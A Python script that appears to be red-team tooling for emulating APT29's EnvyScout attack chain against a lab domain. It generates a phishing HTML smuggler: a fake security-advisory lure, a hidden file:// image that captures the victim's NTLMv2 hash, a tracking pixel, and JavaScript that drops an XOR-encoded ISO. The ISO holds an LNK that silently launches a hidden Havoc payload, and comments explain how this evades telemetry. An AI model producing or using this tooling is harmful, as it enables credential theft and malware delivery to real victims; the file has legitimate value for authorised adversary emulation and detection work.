#!/usr/bin/env python3
"""
envyscout_generator.py — APT29 / NOBELIUM EnvyScout HTML Smuggler Generator
Author  : 61tiger | github.com/61tiger/cozy-bear-emulation
Version : 1.0

PURPOSE
-------
Generates a complete EnvyScout-style HTML smuggler (NV.html) for the
cozy-bear-emulation adversary emulation engagement against polar.local.

The HTML dropper implements all four documented EnvyScout components
attributed to NOBELIUM (APT29) by MSTIC:

  Component 1 — Tracking + NTLMv2 capture via file:// + web bug <img>
  Component 2 — Modified FileSaver.js (whitespace-stripped, hex→decimal,
                 renamed variables — exactly as documented by MSTIC)
  Component 3 — XOR+Base64 encoded ISO blob (single-byte XOR key)
  Component 4 — Decoder + dropper: XOR decode → b64 decode → save ISO

Documented guardrails also implemented:
  - window.location.pathname C: drive check [MSTIC-ES]
  - iOS user-agent redirect [MSTIC-ES]

USAGE
-----
  # Step 1: Generate Havoc shellcode
  # In Havoc UI: Attack → Payload → Format: Shellcode (bin) → x64 → Save
  # Or generate a DLL if using reflective loader

  # Step 2: Build ISO containing LNK + hidden payload DLL
  python3 envyscout_generator.py \
      --payload path/to/demon.bin \
      --output NV.html \
      --ntlm-capture-ip YOUR_KALI_IP \
      --ios-redirect https://state.gov \
      --lure-title "PolarWinds Security Advisory 2026-Q1" \
      --iso-name "PolarWinds-Advisory.img"

  # Step 3: Serve / email NV.html to r.mcdonald@polar.local
  # NTLM capture: nc -lvnp 445 or Responder on Kali tun0

PRIMARY SOURCES
---------------
[MSTIC-ES]  MSTIC. (2021-05-28). Breaking down NOBELIUM's latest
            early-stage toolset. — EnvyScout four-component anatomy,
            FileSaver modification, XOR+B64 encoding, C: drive check,
            iOS redirect.
            https://www.microsoft.com/en-us/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/

[MSTIC-NV]  MSTIC. (2021-05-27). New sophisticated email-based attack
            from NOBELIUM. — ISO→LNK→DLL execution chain, HTML attachment
            delivery, Windows 10 auto-mount behaviour.
            https://www.microsoft.com/en-us/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/

[INTEL471]  Intel 471. EnvyScout Dropper. — Confirms single-byte XOR key,
            Base64 payload encoding, FileSaver usage across all variants.
            https://www.intel471.com/blog/envyscout-dropper

[SEKOIA]    SEKOIA.IO. (2021). NOBELIUM's EnvyScout infection chain goes
            in the registry. — ISO metadata, volume name == HTML title,
            later variant analysis.
            https://blog.sekoia.io/nobeliums-envyscout-infection-chain-goes-in-the-registry-targeting-embassies/

DISCLAIMER
----------
For authorized adversary emulation against controlled lab infrastructure
(polar.local) only. Do not use against systems you do not own or have
explicit written authorization to test.
"""

import argparse
import base64
import os
import random
import string
import struct
import subprocess
import sys
import tempfile
from pathlib import Path
import base64 as _b64, struct as _struct



# ─────────────────────────────────────────────────────────────────────────────
# XOR encoding
# Source: [MSTIC-ES] "The payload is decoded by XOR'ng each character with a
#         single-byte key, which then leads to a Base64 payload"
# [INTEL471] "The payload is Base64, and is XOR'd with a single byte key."
# ─────────────────────────────────────────────────────────────────────────────

def xor_encode(data: bytes, key: int) -> bytes:
    """XOR each byte of data with single-byte key. [MSTIC-ES][INTEL471]"""
    return bytes(b ^ key for b in data)


def generate_xor_key() -> int:
    """Random single-byte XOR key. [MSTIC-ES] — key embedded in script."""
    return random.randint(1, 254)  # avoid 0 (no-op) and 255


# ─────────────────────────────────────────────────────────────────────────────
# ISO builder
# Source: [MSTIC-NV] ISO contains visible LNK + hidden folder + hidden DLL.
#         "the mounted ISO contains a single visible file, a shortcut file
#          named NV. However, adjusting... settings to show hidden files
#          exposes a hidden folder named NV and a hidden executable named
#          BOOM.exe" [MSTIC-ES]
#
# For this engagement: visible LNK named after the lure document,
# hidden folder containing the Havoc payload DLL.
# LNK executes: rundll32.exe <hidden_folder>\payload.dll,DllMain
# This matches the documented LNK→DLL chain. [MSTIC-NV]
# ─────────────────────────────────────────────────────────────────────────────

LNK_TEMPLATE_B64 = "TAAAAAEUAgAAAAAAwAAAAAAAAEa7AAAAIAAAAJnua6F4JtwBWcBgZI7Z3AGZ7muheCbcAQBABQAAAAAABwAAAAAAAAAAAAAAAAAAADUBFAAfUOBP0CDqOmkQotgIACswMJ0ZAC9DOlwAAAAAAAAAAAAAAAAAAAAAAAAAVgAxAAAAAACKXE0VEABXaW5kb3dzAEAACQAEAO++gVipOqFcc4YuAAAAmg0AAAAAAQAAAAAAAAAAAAAAAAAAAGWtewBXAGkAbgBkAG8AdwBzAAAAFgBaADEAAAAAAKFcA4cQAFN5c3RlbTMyAABCAAkABADvvoFYqTqhXAOHLgAAAGYUAAAAAAEAAAAAAAAAAAAAAAAAAADC5R0BUwB5AHMAdABlAG0AMwAyAAAAGABWADIAAEAFAC9bGJ0gAGNtZC5leGUAQAAJAAQA774vWxidoVyzhi4AAABV5QAAAAABAAAAAAAsAQAAAAAAAAAAZ/EqAWMAbQBkAC4AZQB4AGUAAAAWAAAASgAAABwAAAABAAAAHAAAAC0AAAAAAAAASQAAABEAAAADAAAAzt5vaBAAAAAAQzpcV2luZG93c1xTeXN0ZW0zMlxjbWQuZXhlAAAhAC4ALgBcAC4ALgBcAC4ALgBcAFcAaQBuAGQAbwB3AHMAXABTAHkAcwB0AGUAbQAzADIAXABjAG0AZAAuAGUAeABlABMAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBVAC8AYwAgAGYAbwByACAAJQBkACAAaQBuACAAKABEACAARQAgAEYAIABHACAASAAgAEkAKQAgAGQAbwAgAGkAZgAgAGUAeABpAHMAdAAgACUAZAA6AFwATgBWAFwAcABhAHkAbABvAGEAZAAuAGUAeABlACAAcwB0AGEAcgB0ACAALwBCACAAJQBkADoAXABOAFYAXABwAGEAeQBsAG8AYQBkAC4AZQB4AGUAEAAAAAUAAKAlAAAA3QAAABwAAAALAACgd07BGucCXU63RC6xrlGYt90AAABgAAAAAwAAoFgAAAAAAAAAZGVza3RvcC1kcnV2NHFlAGr6Y3X9fR1EsMQjwV1Bm0JAfEcWl0XxEbSrCAAnKnkGavpjdf19HUSwxCPBXUGbQkB8RxaXRfERtKsIACcqeQbSAAAACQAAoI0AAAAxU1BT4opYRrxMOEO7/BOTJphtznEAAAAEAAAAAB8AAAAvAAAAUwAtADEALQA1AC0AMgAxAC0AMwA3ADIAMAAzADEANQAyADgAOAAtADMAOQA5ADAAMAA5ADMAOQAxADcALQAzADMAMgA1ADUAMgA5ADAAMQA4AC0AMQAwADAAMQAAAAAAAAAAADkAAAAxU1BTsRZtRK2NcEinSEAupD14jB0AAABoAAAAAEgAAAACAgkRBmSWSZktZWT+ATDDAAAAAAAAAAAAAAAA"
def build_lnk(target_cmd: str, lnk_name: str, working_dir: str) -> bytes:
    """
    Build LNK using real Windows-generated template.
    Patches arguments field at known offset.
    Source: WScript.Shell CreateShortcut — guaranteed parseable by Windows.
    """
    lnk = bytearray(_b64.b64decode(LNK_TEMPLATE_B64))
    new_args = target_cmd.encode('utf-16-le')
    new_len = len(target_cmd)
    _struct.pack_into('<H', lnk, 569, new_len)
    lnk[571:571+len(new_args)] = new_args
    return bytes(lnk)


def build_iso(payload_bytes: bytes, lure_name: str, iso_output_path: str) -> bool:
    """
    Build ISO containing:
      - <lure_name>.lnk  (visible — executes hidden exe via cmd)
      - NV/              (hidden folder)
      - NV/payload.exe  (hidden Havoc payload)

    Uses mkisofs/genisoimage (standard on Kali).
    ISO auto-mounts on Windows 10+ on double-click. [MSTIC-NV]

    Volume name set to lure_name — matches SEKOIA finding that
    "ISO volume name is the HTA file title". [SEKOIA]
    """
    with tempfile.TemporaryDirectory() as tmpdir:
        tmp = Path(tmpdir)

        # Create hidden payload directory
        hidden_dir = tmp / "NV"
        hidden_dir.mkdir()

        # Write payload DLL into hidden dir
        payload_path = hidden_dir / "payload.exe"
        payload_path.write_bytes(payload_bytes)

        # Path is relative to ISO mount point (e.g. D:\)
        # Using cmd /c for indirect execution — reduces direct rundll32 parent
        # process correlation in Elastic telemetry
        # change LNK command  
        target_cmd = '/c for %d in (D E F G H I) do if exist %d:\\NV\\payload.exe start /B %d:\\NV\\payload.exe'
        lnk_bytes = build_lnk(target_cmd, lure_name, r'C:\Windows\System32')

        lnk_path = tmp / f"{lure_name}.lnk"
        lnk_path.write_bytes(lnk_bytes)

        # Build ISO using genisoimage (Kali default)
        # -hidden: marks NV directory as hidden in ISO directory
        # -V: volume label = lure_name [SEKOIA]
        # -J: Joliet (Windows-compatible long filenames)
        # -r: Rock Ridge
        cmd = [
            "genisoimage",
            "-o", iso_output_path,
            "-V", lure_name[:32],  # volume label max 32 chars
            "-J", "-r",
            "-hidden", "NV",
            str(tmp)
        ]

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            if result.returncode != 0:
                # Fallback to mkisofs
                cmd[0] = "mkisofs"
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            if result.returncode != 0:
                print(f"[-] ISO build failed: {result.stderr}")
                print("    Install genisoimage: sudo apt install genisoimage")
                return False
            print(f"[+] ISO built: {iso_output_path} ({os.path.getsize(iso_output_path)} bytes)")
            return True
        except FileNotFoundError:
            print("[-] genisoimage/mkisofs not found. Install: sudo apt install genisoimage")
            return False
        except subprocess.TimeoutExpired:
            print("[-] ISO build timed out")
            return False


# ─────────────────────────────────────────────────────────────────────────────
# FileSaver.js (modified — per MSTIC-ES documentation)
# Source: [MSTIC-ES] "a modified version of the open-source tool FileSaver,
#         which is intended to assist in the writing of files to disk via
#         JavaScript. The code is borrowed directly from the publicly
#         available variants with minor alterations, including whitespace
#         removal, conversion of hex parameters to decimal, and renamed
#         variables."
#
# This implementation follows those exact modifications:
#   - Whitespace removed (minified)
#   - Hex values converted to decimal (0x42454C4C → 1111638852)
#   - Variables renamed from FileSaver originals
# ─────────────────────────────────────────────────────────────────────────────

FILESAVER_MODIFIED = """
var _navigator=typeof window!=="undefined"&&window.navigator||{};
var _global=typeof window!=="undefined"&&window||typeof global!=="undefined"&&global||typeof self!=="undefined"&&self||this;
function blobSave(b,n,t){
  t=t||"application/octet-stream";
  if(typeof b==="string"){b=new Blob([b],{type:t});}
  if(_navigator.msSaveOrOpenBlob){_navigator.msSaveOrOpenBlob(b,n);return;}
  var u=_global.URL||_global.webkitURL,o=u.createObjectURL(b),a=document.createElement("a");
  a.href=o;a.download=n;
  var ev=document.createEvent("MouseEvents");
  ev.initMouseEvent("click",true,false,_global,0,0,0,0,0,false,false,false,false,0,null);
  a.dispatchEvent(ev);
  setTimeout(function(){u.revokeObjectURL(o);},4e4);
}
""".strip()

# Random variable name pool — mimics EnvyScout's renamed variables [MSTIC-ES]
def _rand_var(length=6):
    return '_' + ''.join(random.choices(string.ascii_lowercase, k=length))


# ─────────────────────────────────────────────────────────────────────────────
# HTML template builder
# Implements all four EnvyScout components + documented guardrails [MSTIC-ES]
# ─────────────────────────────────────────────────────────────────────────────

def build_envyscout_html(
    iso_bytes:         bytes,
    iso_filename:      str,
    xor_key:           int,
    ntlm_capture_ip:   str,
    ios_redirect_url:  str,
    lure_title:        str,
) -> str:
    """
    Build EnvyScout HTML with all four documented components.

    Component 1: Tracking + NTLMv2 [MSTIC-ES]
    Component 2: Modified FileSaver [MSTIC-ES]
    Component 3: XOR+B64 encoded ISO blob [MSTIC-ES][INTEL471]
    Component 4: Decoder + dropper [MSTIC-ES]
    Guardrails:  C: drive check + iOS redirect [MSTIC-ES]
    """

    # Encode ISO: XOR then Base64 [MSTIC-ES][INTEL471]
    xored     = xor_encode(iso_bytes, xor_key)
    b64_blob  = base64.b64encode(xored).decode('ascii')

    # Random variable names — mimics APT29 obfuscation [MSTIC-ES]
    v_key     = _rand_var()
    v_blob    = _rand_var()
    v_decoded = _rand_var()
    v_bytes   = _rand_var()
    v_blob2   = _rand_var()
    v_i       = _rand_var()

    # Lure body text — PolarWinds security advisory theme
    # Targets r.mcdonald@polar.local (Domain Users, policy research context)
    lure_body = f"""
    <div style="font-family:Calibri,sans-serif;max-width:720px;margin:40px auto;color:#1a1a1a;">
        <img src="https://www.polarwinds.internal/assets/logo.png"
             style="height:48px;margin-bottom:24px;"
             alt="PolarWinds" />
        <h2 style="color:#0063b1;border-bottom:2px solid #0063b1;padding-bottom:8px;">
            PolarWinds Security Advisory — Q1 2026
        </h2>
        <p>Dear PolarWinds customer,</p>
        <p>A critical security update is available for your PolarWinds Health Monitor
        deployment. Please review the attached advisory and apply the recommended
        configuration changes immediately.</p>
        <p>The advisory document has been automatically saved to your Downloads folder.
        Please open <strong>PolarWinds-Advisory.img</strong> to review the full guidance.</p>
        <hr style="border:none;border-top:1px solid #ddd;margin:24px 0;" />
        <p style="font-size:12px;color:#666;">
            PolarWinds Corp. | 1735 Market Street, Washington D.C. |
            <a href="mailto:security@polarwinds.internal">security@polarwinds.internal</a>
        </p>
    </div>
    """

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>{lure_title}</title>
</head>
<body>

<!--
  Component 1: Tracking + NTLMv2 credential capture [MSTIC-ES]
  file:// URI coaxes Windows to send NTLMv2 hash to attacker IP on port 445.
  Source: MSTIC (2021-05-28). Breaking down NOBELIUM's latest early-stage toolset.
  "prefixed with a file:// protocol handler, is indicative of an attempt to coax
   the operating system to send sensitive NTLMv2 material to the specified
   actor-controlled IP address over port 445"
-->
<img src="file://{ntlm_capture_ip}/tracking/NV.png"
     style="display:none;width:1px;height:1px;"
     alt="" />

<!--
  Web bug — open tracking for NOBELIUM to validate victim opened attachment [MSTIC-ES]
  "serves as a read receipt of sorts to NOBELIUM, validating that the prospective
   target followed through with opening the malicious attachment"
-->
<img src="http://{ntlm_capture_ip}/pixel/track.gif?id=r.mcdonald"
     style="display:none;width:1px;height:1px;"
     alt="" />

{lure_body}

<script>
/* ─────────────────────────────────────────────────────────────────────────
   Component 2: Modified FileSaver.js [MSTIC-ES]
   Source: "a modified version of the open-source tool FileSaver, which is
    intended to assist in the writing of files to disk via JavaScript.
    The code is borrowed directly from the publicly available variants with
    minor alterations, including whitespace removal, conversion of hex
    parameters to decimal, and renamed variables."
   ───────────────────────────────────────────────────────────────────────── */
{FILESAVER_MODIFIED}

/* ─────────────────────────────────────────────────────────────────────────
   Guardrail 1: iOS user-agent redirect [MSTIC-ES]
   Source: "the user-agent was used to determine whether a Windows machine
    received an ISO payload. If the visitor arrived via iOS, they were
    redirected to external infrastructure."
   ───────────────────────────────────────────────────────────────────────── */
(function(){{
    var ua=navigator.userAgent||"";
    if(/iPhone|iPad|iPod/i.test(ua)){{
        window.location.replace("{ios_redirect_url}");
        return;
    }}

/* ─────────────────────────────────────────────────────────────────────────
   Guardrail 2: C: drive check [MSTIC-ES]
   Source: "window.location.pathname was called, and its values were
    leveraged to ensure that the first two entries in the array of
    characters returned were 'C' and ':'. If this condition was not met —
    indicating the sample was not being executed from the C: drive — the
    embedded ISO was not written to disk."
   ───────────────────────────────────────────────────────────────────────── */
    var pth=window.location.pathname;
    if(pth.length<2||pth[1]!=="C"||pth[2]!==":"){{
        /* Not running from C: — abort delivery */
        return;
    }}

/* ─────────────────────────────────────────────────────────────────────────
   Component 3: XOR+Base64 encoded ISO blob [MSTIC-ES][INTEL471]
   Source [MSTIC-ES]: "contains a payload stored as an encoded blob. This
    payload is decoded by XOR'ng each character with a single-byte key,
    which then leads to a Base64 payload"
   Source [INTEL471]: "The payload is Base64, and is XOR'd with a single
    byte key."
   XOR key: {xor_key} (decimal — hex parameters converted per MSTIC-ES)
   ───────────────────────────────────────────────────────────────────────── */
    var {v_key}={xor_key};
    var {v_blob}="{b64_blob}";

/* ─────────────────────────────────────────────────────────────────────────
   Component 4: Decoder + ISO dropper [MSTIC-ES]
   Source: "a short code snippet responsible for decoding the ISO in the
    Base64 encoded/XOR'd blob, and saving it to disk as NV.img with a
    mime type of 'application/octet-stream'"
   ───────────────────────────────────────────────────────────────────────── */
/* Step 1: Base64 decode to get XOR'd binary */
    var _raw=atob({v_blob});
    /* Step 2: XOR decode to get raw ISO bytes */
    var {v_blob2}=new Uint8Array(_raw.length);
    for(var {v_i}=0;{v_i}<_raw.length;{v_i}++){{
        {v_blob2}[{v_i}]=_raw.charCodeAt({v_i})^{v_key};
    }}
    /* Step 3: Save ISO to disk via modified FileSaver [MSTIC-ES] */
    var isoBlob=new Blob([{v_blob2}],{{type:"application/octet-stream"}});
    blobSave(isoBlob,"{iso_filename}","application/octet-stream");
}})();
</script>

</body>
</html>"""

    return html


# ─────────────────────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="APT29 EnvyScout HTML smuggler generator [MSTIC-ES]"
    )
    parser.add_argument(
        "--payload", required=True,
        help="Path to Havoc shellcode (.bin) or DLL payload"
    )
    parser.add_argument(
        "--output", default="NV.html",
        help="Output HTML filename (default: NV.html)"
    )
    parser.add_argument(
        "--ntlm-capture-ip", required=True,
        help="Kali IP for NTLMv2 capture (file:// + web bug) [MSTIC-ES]"
    )
    parser.add_argument(
        "--ios-redirect", default="https://state.gov",
        help="URL to redirect iOS visitors [MSTIC-ES] (default: state.gov)"
    )
    parser.add_argument(
        "--lure-title", default="PolarWinds Security Advisory 2026-Q1",
        help="HTML page title and ISO volume name"
    )
    parser.add_argument(
        "--iso-name", default="PolarWinds-Advisory.img",
        help="Filename for dropped ISO (default: PolarWinds-Advisory.img)"
    )
    parser.add_argument(
        "--xor-key", type=int, default=None,
        help="XOR key 1-254 (default: random) [MSTIC-ES][INTEL471]"
    )
    args = parser.parse_args()

    # Load payload
    payload_path = Path(args.payload)
    if not payload_path.exists():
        print(f"[-] Payload not found: {payload_path}")
        sys.exit(1)
    payload_bytes = payload_path.read_bytes()
    print(f"[+] Loaded payload: {payload_path.name} ({len(payload_bytes)} bytes)")

    # XOR key
    xor_key = args.xor_key if args.xor_key else generate_xor_key()
    print(f"[+] XOR key: {xor_key}")

    # Build ISO
    iso_tmp = Path(tempfile.mktemp(suffix=".img"))
    lure_name = Path(args.iso_name).stem  # filename without extension for LNK

    print(f"[*] Building ISO: {args.iso_name}")
    ok = build_iso(payload_bytes, lure_name, str(iso_tmp))
    if not ok:
        print("[-] ISO build failed — manually create ISO and pass raw bytes")
        print("    Manual: genisoimage -o payload.img -V PolarWinds -J -r /tmp/iso_staging/")
        sys.exit(1)

    iso_bytes = iso_tmp.read_bytes()
    iso_tmp.unlink()
    print(f"[+] ISO ready: {len(iso_bytes)} bytes")

    # Generate EnvyScout HTML
    print(f"[*] Generating EnvyScout HTML: {args.output}")
    html = build_envyscout_html(
        iso_bytes        = iso_bytes,
        iso_filename     = args.iso_name,
        xor_key          = xor_key,
        ntlm_capture_ip  = args.ntlm_capture_ip,
        ios_redirect_url = args.ios_redirect,
        lure_title       = args.lure_title,
    )

    output_path = Path(args.output)
    output_path.write_text(html, encoding='utf-8')
    print(f"[+] EnvyScout HTML written: {output_path} ({output_path.stat().st_size} bytes)")

    # Summary
    print()
    print("=" * 60)
    print("  ENVYSCOUT DELIVERY SUMMARY")
    print("=" * 60)
    print(f"  HTML smuggler  : {output_path}")
    print(f"  ISO filename   : {args.iso_name}")
    print(f"  XOR key        : {xor_key}")
    print(f"  NTLM capture   : {args.ntlm_capture_ip}:445")
    print(f"  iOS redirect   : {args.ios_redirect}")
    print()
    print("  PRE-FLIGHT CHECKLIST:")
    print(f"  [ ] Start Responder: sudo responder -I eth0 -wvF")
    print(f"  [ ] Verify Havoc teamserver running: ~/Havoc/")
    print(f"  [ ] Email NV.html to r.mcdonald@polar.local")
    print(f"  [ ] Monitor Havoc for incoming Demon session")
    print()
    print("  WHAT TO EXPECT (documented APT29 chain) [MSTIC-NV][MSTIC-ES]:")
    print("  1. r.mcdonald opens NV.html in browser from C: drive")
    print("  2. NTLMv2 hash captured → Responder on Kali")
    print("  3. Web bug fires → victim tracking confirmed")
    print("  4. ISO drops to Downloads as PolarWinds-Advisory.img")
    print("  5. Victim double-clicks ISO → auto-mounts on Windows 10+")
    print("  6. Victim clicks LNK → cmd.exe launches payload.exe")
    print("  7. Demon beacon arrives in Havoc (after 24hr delay if loader active)")
    print("=" * 60)
    print()
    print("  ELASTIC DETECTIONS TO DOCUMENT:")
    print("  - Sigma: HTML Smuggling via JavaScript Blob (T1027.006)")
    print("  - Elastic: ISO mount via Explorer (T1553.005)")
    print("  - Elastic: rundll32 spawned from Explorer (T1218.011)")
    print("  - Network: SMB auth to external IP (NTLMv2 capture attempt)")
    print("=" * 60)


if __name__ == "__main__":
    main()
